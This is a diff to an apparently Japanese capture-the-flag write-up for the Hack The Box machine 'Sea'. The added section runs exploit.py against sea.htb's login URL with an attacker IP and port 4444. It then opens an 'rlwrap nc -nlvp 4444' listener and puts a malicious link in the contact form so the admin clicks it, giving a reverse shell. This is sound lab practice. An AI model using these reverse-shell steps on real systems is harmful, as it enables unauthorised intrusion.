@@ -46,9 +46,6 @@ INPUT:
  http://[ip]へアクセス
 ```
 
-OUTPUT：
-![Sea_HP](./image/Sea_HP.png)
-
 <br>
 
 以下のコマンドを実行し、ディレクトリをスキャン
@@ -262,6 +259,36 @@ var urlWithoutLogBase = "http://sea.htb";
 ```
 
 <br>
+
+exploit.pyを実行
+```
+INPUT:
+python exploit.py http://sea.htb/loginURL [attacker ip] 4444 
+```
+※ ターゲットのURLには、必ずドメイン（sea.htb）を用いること。（IPアドレスを指定してはならない）
+
+<br>
+
+exploit.pyの出力内容に従い、ncコマンドを実行する。
+
+```
+INPUT:
+rlwrap nc -nlvp 4444
+```
+
+<br>
+
+exploit.pyの出力内容に従い、adminユーザにリンクを踏ませる。
+
+```
+INPUT:
+http://sea.htb/contact.php の Website欄にリンクを貼り、submitする。
+他の欄は適当に埋める。
+```
+
+<br>
+
+1分程度経過後、リバースシェルを獲得する
 
 
 
